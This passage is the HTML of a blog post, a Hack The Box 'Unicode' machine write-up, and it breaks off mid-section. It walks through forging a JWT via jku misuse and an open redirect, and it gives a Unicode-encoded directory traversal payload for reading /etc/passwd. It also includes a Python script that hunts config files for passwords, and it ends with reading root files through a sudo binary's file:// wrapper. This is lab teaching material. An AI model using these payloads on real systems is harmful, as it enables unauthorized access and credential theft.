@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Unicode Hackthebox writeup - My New Hugo Site</title><meta name="Description" content="This is 0xMesbaha"><meta property="og:url" content="http://example.org/posts/linux-machines/2022-05-07-unicode/">
+  <meta property="og:site_name" content="My New Hugo Site">
+  <meta property="og:title" content="Unicode Hackthebox writeup">
+  <meta property="og:description" content="In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-07T12:49:13+10:00">
+    <meta property="article:modified_time" content="2022-05-07T12:49:13+10:00">
+    <meta property="article:tag" content="Hackthebox">
+    <meta property="article:tag" content="JWT">
+    <meta property="article:tag" content="Directory-Traversal">
+    <meta property="article:tag" content="Decompile-Binary">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Unicode Hackthebox writeup">
+  <meta name="twitter:description" content="In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.">
+      <meta name="twitter:site" content="@tinkerhell1337">
+<meta name="application-name" content="0xMesbaha">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://example.org/posts/linux-machines/2022-05-07-unicode/" /><link rel="prev" href="http://example.org/posts/web-exploitation/2022-05-02-hacker-ts/" /><link rel="next" href="http://example.org/posts/web-exploitation/2022-05-19-kryptos-support/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Unicode Hackthebox writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/example.org\/posts\/linux-machines\/2022-05-07-unicode\/"
+        },"genre": "posts","keywords": "Hackthebox, JWT, directory-traversal, decompile-binary","wordcount":  1036 ,
+        "url": "http:\/\/example.org\/posts\/linux-machines\/2022-05-07-unicode\/","datePublished": "2022-05-07T12:49:13+10:00","dateModified": "2022-05-07T12:49:13+10:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "0xMesbaha"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="My New Hugo Site">0xMesbaha</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="My New Hugo Site">0xMesbaha</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Unicode Hackthebox writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>0xMesbaha</a></span>&nbsp;<span class="post-category"> <a href="/categories/linux-machines/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Machines</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-05-07">2022-05-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1036 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#analyzing-the-binary">Analyzing the binary</a></li>
+    <li><a href="#root-access">Root Access</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>In This medium Box we are playing with JWT Tokens in specific the jku Claim Misuse , which will let us login as admin account then we will use the Unicode Encoding to read files on the system. Eventually we will find a password for user then ssh to login. for the root part we are abusing the sudo privilege on a binary which can read files on the system.</p>
+<h1 id="scanning">Scanning</h1>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -T5 10.10.11.126 -oN nmap/intial.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-generator: Hugo 0.83.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Hackmedia
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div></div>
+<p>and the full port scan doesn&rsquo;t reveal more ports.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>As we only have the web service to enumerate let&rsquo;s get into it:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506204508.png"
+        data-srcset="/assets/images/unicode/20220506204508.png, /assets/images/unicode/20220506204508.png 1.5x, /assets/images/unicode/20220506204508.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506204508.png"
+        title="error" /></p>
+<p>static page doesn&rsquo;t tell much , it has Login and register functions. we can try to do some authentication bypass at login But no results. so let&rsquo;s create an account and login with it</p>
+<p>Once we login we have this <code>/dashboard</code> page :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506204717.png"
+        data-srcset="/assets/images/unicode/20220506204717.png, /assets/images/unicode/20220506204717.png 1.5x, /assets/images/unicode/20220506204717.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506204717.png"
+        title="error" /></p>
+<p>it also has an upload function we can try uploading files But doesn&rsquo;t reveal any indicator where it is uploaded. so we can leave at as the 2nd option for us</p>
+<p>we can notice also the cookie we have :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506204858.png"
+        data-srcset="/assets/images/unicode/20220506204858.png, /assets/images/unicode/20220506204858.png 1.5x, /assets/images/unicode/20220506204858.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506204858.png"
+        title="error" /></p>
+<p>Seems like JWT thing we can take it and paste it into <a href="https://jwt.io/" target="_blank" rel="noopener noreffer ">jwt.io</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506205319.png"
+        data-srcset="/assets/images/unicode/20220506205319.png, /assets/images/unicode/20220506205319.png 1.5x, /assets/images/unicode/20220506205319.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506205319.png"
+        title="error" /></p>
+<p>we can see the url <code>http://hackmedia.htb/static/jwks.json</code> , adding the <code>hackmedia.htb</code> to the <code>/etc/hosts</code> then viewing the page :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506205439.png"
+        data-srcset="/assets/images/unicode/20220506205439.png, /assets/images/unicode/20220506205439.png 1.5x, /assets/images/unicode/20220506205439.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506205439.png"
+        title="error" /></p>
+<p>so it seems it visits this page for the verification process , searching for JWT JKU attacks found this great Article <a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c" target="_blank" rel="noopener noreffer ">Here</a> and it looks exactly like the situation we have.</p>
+<p><strong>Briefly we will :</strong></p>
+<p>1- Generate public and private key and add them as a signature for the JWT token and change the username to <strong>admin</strong></p>
+<p>2- in the <code>jwks.json</code> modify the <strong>n</strong> value with the one we got at generation</p>
+<p>3- modify the JKU with your host then host the <code>jwks.json</code> at our http server .</p>
+<p>By hosting it and make the web application visit us to verify we will login with our forged JWT.</p>
+<p>using <a href="https://mkjwk.org/" target="_blank" rel="noopener noreffer ">here</a> with the following options:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506210001.png"
+        data-srcset="/assets/images/unicode/20220506210001.png, /assets/images/unicode/20220506210001.png 1.5x, /assets/images/unicode/20220506210001.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506210001.png"
+        title="error" /></p>
+<p>using the private and public keys at the signature at <code>jwt.io</code> , and take the <strong>n</strong> value to modify the <code>jwks.json</code> we will host</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506210334.png"
+        data-srcset="/assets/images/unicode/20220506210334.png, /assets/images/unicode/20220506210334.png 1.5x, /assets/images/unicode/20220506210334.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506210334.png"
+        title="error" /></p>
+<p>now modify the JKU, username and the Signature:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506210527.png"
+        data-srcset="/assets/images/unicode/20220506210527.png, /assets/images/unicode/20220506210527.png 1.5x, /assets/images/unicode/20220506210527.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506210527.png"
+        title="error" /></p>
+<p>now using that JWT as our new cookie we got this and it didn&rsquo;t even make the request to our side.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506210617.png"
+        data-srcset="/assets/images/unicode/20220506210617.png, /assets/images/unicode/20220506210617.png 1.5x, /assets/images/unicode/20220506210617.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506210617.png"
+        title="error" /></p>
+<p>digging more and using dirsearch found :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="m">308</span>   266B   http://10.10.11.126:80/dashboard    -&gt; REDIRECTS TO: http://10.10.11.126/dashboard/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   262B   http://10.10.11.126:80/display    -&gt; REDIRECTS TO: http://10.10.11.126/display/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   258B   http://10.10.11.126:80/error    -&gt; REDIRECTS TO: http://10.10.11.126/error/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   264B   http://10.10.11.126:80/internal    -&gt; REDIRECTS TO: http://10.10.11.126/internal/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   258B   http://10.10.11.126:80/login    -&gt; REDIRECTS TO: http://10.10.11.126/login/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   262B   http://10.10.11.126:80/pricing    -&gt; REDIRECTS TO: http://10.10.11.126/pricing/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   264B   http://10.10.11.126:80/redirect    -&gt; REDIRECTS TO: http://10.10.11.126/redirect/
+</span></span><span class="line"><span class="cl"><span class="m">308</span>   264B   http://10.10.11.126:80/register    -&gt; REDIRECTS TO: http://10.10.11.126/register/</span></span></code></pre></div></div>
+<p>and trying the following it makes the request to our side :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-html">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">http://10.10.11.126/redirect?url=10.10.16.39</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506210957.png"
+        data-srcset="/assets/images/unicode/20220506210957.png, /assets/images/unicode/20220506210957.png 1.5x, /assets/images/unicode/20220506210957.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506210957.png"
+        title="error" /></p>
+<p>We can try modifying the JKU again with :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506211117.png"
+        data-srcset="/assets/images/unicode/20220506211117.png, /assets/images/unicode/20220506211117.png 1.5x, /assets/images/unicode/20220506211117.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506211117.png"
+        title="error" /></p>
+<p>we also got :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506211149.png"
+        data-srcset="/assets/images/unicode/20220506211149.png, /assets/images/unicode/20220506211149.png 1.5x, /assets/images/unicode/20220506211149.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506211149.png"
+        title="error" /></p>
+<p>maybe it is checking for the word &ldquo;static&rdquo; we can try :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506211238.png"
+        data-srcset="/assets/images/unicode/20220506211238.png, /assets/images/unicode/20220506211238.png 1.5x, /assets/images/unicode/20220506211238.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506211238.png"
+        title="error" /></p>
+<p>sending the cookie finally we are in :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506211310.png"
+        data-srcset="/assets/images/unicode/20220506211310.png, /assets/images/unicode/20220506211310.png 1.5x, /assets/images/unicode/20220506211310.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506211310.png"
+        title="error" /></p>
+<p><!-- raw HTML omitted --><strong>Note</strong> :Don&rsquo;t close your http server as it will request the verify with each request issued<!-- raw HTML omitted --></p>
+<h1 id="foothold">Foothold</h1>
+<p>visiting the <strong>last quarter</strong> we can find it issues this request :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>http://10.10.11.126/display/?page=quarterly.pdf</code></pre></div>
+<p>we can try directory traversal But it fails , we can make use of the <a href="https://owasp.org/www-community/attacks/Unicode_Encoding" target="_blank" rel="noopener noreffer ">Unicode_Encoding</a> as the machine name suggests , and using this payload</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">page</span><span class="o">=</span>%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd</span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506211903.png"
+        data-srcset="/assets/images/unicode/20220506211903.png, /assets/images/unicode/20220506211903.png 1.5x, /assets/images/unicode/20220506211903.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506211903.png"
+        title="error" /></p>
+<p>It works , we can try to read the ssh key for the user <strong>code</strong> But we can&rsquo;t. so we can start fuzzing different files on the machine until we got a password for our foothold.</p>
+<p>From the <code>/etc/passwd</code> we can see it has the MYSQL and ngnix Services running we can read their configuration files.</p>
+<p>searching online found these default configuration files :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">/etc/mysql/my.cnf
+</span></span><span class="line"><span class="cl">/var/lib/mysql/my.cnf
+</span></span><span class="line"><span class="cl">/var/log/mysql.log
+</span></span><span class="line"><span class="cl">/etc/nginx/nginx.conf
+</span></span><span class="line"><span class="cl">/etc/nginx/sites-available/default</span></span></code></pre></div></div>
+<p>i added some files as well and write down this script searching for passwords:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://10.10.11.126/display/?page=</span><span class="si">%E</span><span class="s1">F%B8%B0/</span><span class="si">%E</span><span class="s1">F%B8%B0/</span><span class="si">%E</span><span class="s1">F%B8%B0/</span><span class="si">%E</span><span class="s1">F%B8%B0/</span><span class="si">%E</span><span class="s1">F%B8%B0&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cookie</span> <span class="o">=</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;auth&#39;</span> <span class="p">:</span> <span class="s1">&#39;&lt;your_auth&gt;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;wordlist.txt&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">wordlist</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="n">word</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="n">word</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="s1">&#39;font&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="ow">and</span> <span class="s1">&#39;animation&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;file </span><span class="si">{</span><span class="n">word</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2"> : 404 NOTFOUND&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">else</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">			<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;file </span><span class="si">{</span><span class="n">word</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="si">}</span><span class="s2"> : 200 OK&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="s2">&#34;pass&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="p">:</span>
+</span></span><span class="line"><span class="cl">				<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">				<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">#time.sleep(3)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506224248.png"
+        data-srcset="/assets/images/unicode/20220506224248.png, /assets/images/unicode/20220506224248.png 1.5x, /assets/images/unicode/20220506224248.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506224248.png"
+        title="error" /></p>
+<p>we can see the comment <code>#change the user password from db.yaml</code> .we can also it reveals other directories at the home of the user code</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>/home/code/coder/static/styles/
+/home/code/app/</code></pre></div>
+<p>Eventually will find out the <code>db.yaml</code> is at <code>/home/code/coder/db.yaml</code> :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506224642.png"
+        data-srcset="/assets/images/unicode/20220506224642.png, /assets/images/unicode/20220506224642.png 1.5x, /assets/images/unicode/20220506224642.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506224642.png"
+        title="error" /></p>
+<p>using this password we can login with ssh successfully</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506224830.png"
+        data-srcset="/assets/images/unicode/20220506224830.png, /assets/images/unicode/20220506224830.png 1.5x, /assets/images/unicode/20220506224830.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506224830.png"
+        title="error" /></p>
+<h1 id="privilege-escalation">Privilege escalation</h1>
+<p>Examining the binary we have :</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506225759.png"
+        data-srcset="/assets/images/unicode/20220506225759.png, /assets/images/unicode/20220506225759.png 1.5x, /assets/images/unicode/20220506225759.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506225759.png"
+        title="error" /></p>
+<p>so it seems it can take a url and download the content into a file we can read latter:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506231218.png"
+        data-srcset="/assets/images/unicode/20220506231218.png, /assets/images/unicode/20220506231218.png 1.5x, /assets/images/unicode/20220506231218.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506231218.png"
+        title="error" /></p>
+<p>After some tinkering around , we can use the <code>File://</code> wrapper to read local files :&quot;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220506232454.png"
+        data-srcset="/assets/images/unicode/20220506232454.png, /assets/images/unicode/20220506232454.png 1.5x, /assets/images/unicode/20220506232454.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220506232454.png"
+        title="error" /></p>
+<p>and Finally you can read the flag with <code>File:///root/root.txt</code></p>
+<h2 id="analyzing-the-binary">Analyzing the binary</h2>
+<p>Downloading the Binary and start analyzing it , searching online found some tools which can help us de-compile a python binary and the binary we have looks like a python binary indeed</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/assets/images/unicode/20220507100201.png"
+        data-srcset="/assets/images/unicode/20220507100201.png, /assets/images/unicode/20220507100201.png 1.5x, /assets/images/unicode/20220507100201.png 2x"
+        data-sizes="auto"
+        alt="/assets/images/unicode/20220507100201.png"
+        title="error" /></p>
+<p>commands used :</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
